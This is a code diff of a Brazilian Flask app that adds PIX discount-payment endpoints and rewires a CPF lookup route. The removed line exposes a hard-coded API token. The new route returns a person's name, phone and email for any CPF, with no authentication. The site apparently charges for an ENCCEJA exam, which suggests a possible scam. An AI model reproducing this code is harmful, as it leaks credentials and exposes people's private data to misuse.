@@ -923,6 +923,63 @@ def verificar_cpf():
     app.logger.info("[PROD] Acessando página de verificação de CPF: verificar-cpf.html")
     return render_template('verificar-cpf.html')
 
+@app.route('/api/create-discount-payment', methods=['POST'])
+def create_discount_payment():
+    try:
+        # Obter os dados do usuário da requisição
+        payment_data = request.get_json()
+        
+        if not payment_data:
+            app.logger.error("[PROD] Dados de pagamento não fornecidos")
+            return jsonify({"error": "Dados de pagamento não fornecidos"}), 400
+        
+        # Criar uma instância da API de pagamento com desconto
+        from pagamentocomdesconto import create_payment_with_discount_api
+        payment_api = create_payment_with_discount_api()
+        
+        # Criar o pagamento PIX com desconto
+        app.logger.info(f"[PROD] Criando pagamento PIX com desconto para CPF: {payment_data.get('cpf', 'N/A')}")
+        result = payment_api.create_pix_payment_with_discount(payment_data)
+        
+        if "error" in result:
+            app.logger.error(f"[PROD] Erro ao criar pagamento PIX com desconto: {result['error']}")
+            return jsonify(result), 500
+        
+        app.logger.info("[PROD] Pagamento PIX com desconto criado com sucesso")
+        return jsonify(result)
+    
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro ao criar pagamento com desconto: {str(e)}")
+        return jsonify({"error": str(e)}), 500
+
+@app.route('/api/check-payment-status')
+def check_discount_payment_status():
+    try:
+        payment_id = request.args.get('id')
+        
+        if not payment_id:
+            app.logger.error("[PROD] ID de pagamento não fornecido")
+            return jsonify({"error": "ID de pagamento não fornecido"}), 400
+        
+        # Criar uma instância da API de pagamento com desconto
+        from pagamentocomdesconto import create_payment_with_discount_api
+        payment_api = create_payment_with_discount_api()
+        
+        # Verificar o status do pagamento
+        app.logger.info(f"[PROD] Verificando status do pagamento com desconto: {payment_id}")
+        result = payment_api.check_payment_status(payment_id)
+        
+        if "error" in result:
+            app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {result['error']}")
+            return jsonify(result), 500
+        
+        app.logger.info(f"[PROD] Status do pagamento verificado: {result.get('status', 'N/A')}")
+        return jsonify(result)
+    
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro ao verificar status do pagamento: {str(e)}")
+        return jsonify({"error": str(e)}), 500
+
 @app.route('/buscar-cpf')
 @check_referer
 def buscar_cpf():
@@ -1434,28 +1491,30 @@ def pagamento_encceja():
 
 @app.route('/consultar-cpf')
 def consultar_cpf():
-    """Busca informações de um CPF na API da Receita Federal"""
+    """Busca informações de um CPF na API do webhook-manager"""
     cpf = request.args.get('cpf')
     if not cpf:
         return jsonify({"error": "CPF não fornecido"}), 400
     
-    # URL da API com o token e CPF
-    api_url = f"https://api.exato.digital/receita-federal/cpf?token=268753a9b3a24819ae0f02159dee6724&cpf={cpf}&format=json"
+    # URL da API especificada
+    api_url = f"https://webhook-manager.replit.app/api/v1/cliente?cpf={cpf}"
     
     try:
         # Fazer a solicitação para a API
         response = requests.get(api_url)
         data = response.json()
         
-        # Extrair os dados necessários
-        if 'Result' in data and data.get('TransactionResultType') == 'Success':
-            result = data['Result']
+        # Verificar se a consulta foi bem-sucedida
+        if data.get('sucesso') and 'cliente' in data:
+            cliente = data['cliente']
             user_data = {
-                'cpf': result.get('NumeroCpf', ''),
-                'nome': result.get('NomePessoaFisica', ''),
-                'dataNascimento': result.get('DataNascimento', '').split('T')[0] if result.get('DataNascimento') else '',
-                'situacao': result.get('SituacaoCadastral', '')
+                'cpf': cliente.get('cpf', ''),
+                'nome': cliente.get('nome', ''),
+                'telefone': cliente.get('telefone', ''),
+                'email': cliente.get('email', ''),
+                'sucesso': True
             }
+            app.logger.info(f"[PROD] CPF consultado com sucesso: {cpf}")
             return jsonify(user_data)
         else:
             # Em caso de erro na API
